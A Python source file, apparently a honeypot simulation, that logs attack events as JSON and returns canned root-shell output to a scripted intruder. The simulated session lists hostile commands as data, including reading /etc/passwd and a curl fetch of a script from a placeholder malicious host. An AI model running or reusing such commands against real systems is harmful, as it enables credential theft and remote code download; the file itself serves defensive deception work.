import time
import json

def log_attack_event(event_type, source_ip, details):
    """
    Logs an attack event to a structured format.
    """
    event = {
        "timestamp": time.ctime(),
        "type": event_type,
        "source": source_ip,
        "details": details,
        "severity": "HIGH" if "exploit" in details.lower() else "LOW"
    }
    return json.dumps(event, indent=2)

def simulate_interaction(port):
    """
    Simulates a high-interaction shell with fake Unix commands.
    """
    fake_commands = {
        "ls": "bin  boot  dev  etc  home  lib  opt  root  run  sbin  tmp  usr  var",
        "whoami": "root",
        "cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
        "uname -a": "Linux web-server-01 5.4.0-104-generic #118-Ubuntu SMP Wed Mar 2 19:02:41 UTC 2022 x86_64",
        "pwd": "/root",
        "id": "uid=0(root) gid=0(root) groups=0(root)"
    }
    
    log = []
    log.append(f"[*] Port {port}: Listening...")
    log.append("[!] ALARM: Connection from 10.0.0.12...")
    
    commands = ["id", "pwd", "ls", "cat /etc/passwd", "curl http://malicious.tk/script.sh"]
    for cmd in commands:
        output = fake_commands.get(cmd, "command not found")
        log.append(f"INTRUDER> {cmd}")
        log.append(f"SYSTEM: {output}")
        
    log.append("[*] Intruder disconnected. Session logged.")
    return log
